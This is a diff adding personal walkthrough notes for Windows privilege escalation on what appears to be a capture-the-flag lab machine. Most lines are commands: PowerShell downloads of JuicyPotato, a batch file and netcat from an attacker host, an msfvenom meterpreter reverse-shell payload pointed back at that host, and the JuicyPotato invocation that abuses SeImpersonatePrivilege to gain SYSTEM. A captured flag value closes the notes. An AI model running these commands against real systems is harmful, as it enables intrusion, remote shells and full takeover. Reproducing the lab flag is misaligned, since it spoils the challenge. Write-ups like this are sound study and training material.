@@ -1,0 +1,44 @@
+#10.10.10.116
+--------------
+--------------------------------------------------------
+#Inside Power Shell
+--------------------------------------------------------
+#check Power Shell version
+$host.Version  
+
+#check users privilege
+whoami /priv
+#found  'SeImpersonatePrivilege'  Enabled  (Impersonate a client after authentication) 
+#Google:-  exploit SeImpersonatePrivilege
+#this vulnerability uses the Abusing of tokens privileges for windows Local Priv Esc
+#read #3.1.1 artical from givel link below
+>>>https://www.exploit-db.com/papers/42556
+
+#after some digging found about juicy_potato
+#Watch IppSec BOUNTY machine video   (24min - 30min)
+#Download juicy_potato and paste into /var/www/html/ 
+>>>https://github.com/ohpe/juicy-potato/releases*
+
+#links to understand how this is going to work
+>>>https://ohpe.it/juicy-potato/
+>>>https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/    [see videos]
+
+#upload juicy_potato(jp.exe) onto server
+#run this on server C:\users\Destitute\Downloads
+Invoke-WebRequest -OutFile C:\users\Destitute\Desktop\jp.exe http://10.10.14.181/jp.exe
+Invoke-WebRequest -OutFile C:\users\Destitute\Desktop\b.bat http://10.10.14.181/b.bat
+Invoke-WebRequest -OutFile C:\users\Destitute\Desktop\nc.exe http://10.10.14.181/nc.exe
+-----------------------------------------------------------
+[NOTE:- here either you can use b.bat file or create reverse shell with msfvenom]
+msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LPORT=9001 LHOST=10.10.14.181 -f exe -o b.exe
+#if using this than listen metasploit 
+-----------------------------------------------------------
+#start listener on 9001  (port is from b.bat)
+#execute this:
+cmd /c jp.exe -t * -p c:\Users\Destitute\Downloads\b.bat -l 9001 -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
+cmd /c jp.exe -t * -p c:\\Users\\Destitute\\Downloads\\b.bat -l 9001 -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
+
+
+#key
+5737DD2EDC29B5B219BC43E60866BE08 
+
